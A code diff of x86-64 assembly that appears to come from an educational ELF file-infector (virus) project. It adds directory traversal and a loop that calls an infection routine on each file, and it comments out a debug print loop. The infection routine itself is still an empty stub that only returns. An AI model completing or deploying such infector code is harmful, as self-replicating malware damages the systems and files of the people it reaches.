@@ -26,6 +26,7 @@ scaffold_start:
     ; signature: u8 "signature abied-ch & fbruggem", 0x0
     ; signature_len: equ $ - signature
 
+.infect_directory:
     mov rax, SYS_OPEN
     lea rdi, [rel dir_path]
     mov rsi, O_RDONLY | O_DIRECTORY
@@ -60,7 +61,7 @@ scaffold_start:
     push rdx ; push a 0 byte to the stack as a stop for the array of pointers
 
 ; loop through the directories and put them on the stack
-.dir_loop
+.dir_loop:
     cmp rdi, rax ; rdi < rax ?
     jge .dir_loop_end
 
@@ -78,12 +79,10 @@ scaffold_start:
     jmp .dir_loop
     
 
-.dir_loop_continue
+.dir_loop_continue:
     xor rcx, rcx
     mov rcx, rdi
     add rcx, dirent.d_name
-
-    mov r15,  rsp ; debugging
 
     ; load len
     xor rbx, rbx
@@ -95,49 +94,61 @@ scaffold_start:
     jmp .dir_loop
 
 
-.dir_loop_end
+.dir_loop_end:
 
 ; now all the strings are on the stack and they are all files
+;
+; .string_loop
+;     pop rsi
+;     cmp rsi, 0
+;     je .string_loop_end
+;
+;     xor rax, rax
+;     mov al, byte [rsi]
+;     cmp al, 4
+;     jne .inner_ahh
+;     inc rsi
+; .not_4_in_front
+;
+; .inner_ahh
+;     mov rax, 1
+;     mov rdi, 1
+;     ; rsi already set
+;     mov rdx, 1
+;
+;     syscall
+;     inc rsi
+;     xor rax, rax
+;     mov al, byte [rsi]
+;     cmp al, 0
+;     jnz .inner_ahh
+;
+;     mov rax, 1
+;     mov rdi, 1
+;     lea rsi, [new_line]
+;     mov rdx, 1
+;     syscall
+;
+;     jmp .string_loop
+;
+; .string_loop_end
+;
 
-.string_loop
-    pop rsi
-    cmp rsi, 0
-    je .string_loop_end
+.iterate_over_files:
+    mov r15, rax
+    pop rax
+    cmp rax, 0
+    je .iterate_over_files_end
 
-    xor rax, rax
-    mov al, byte [rsi]
-    cmp al, 4
-    jne .inner_ahh
-    inc rsi
-.not_4_in_front
+    call .infect_file
 
-.inner_ahh
-    mov rax, 1
-    mov rdi, 1
-    ; rsi already set
-    mov rdx, 1
-
-    syscall
-    inc rsi
-    xor rax, rax
-    mov al, byte [rsi]
-    cmp al, 0
-    jnz .inner_ahh
-
-    mov rax, 1
-    mov rdi, 1
-    lea rsi, [new_line]
-    mov rdx, 1
-    syscall
-
-    jmp .string_loop
-
-.string_loop_end
-
+    jmp .iterate_over_files
+    
 
     ; CALL .infect_file
 
 .infect_file:
+    ret
     ; validate that it is a 64 bit infectable elf
     ; check if it already has the signature
 
@@ -152,6 +163,7 @@ scaffold_start:
 
 
 
+.iterate_over_files_end:
 
 
 error:
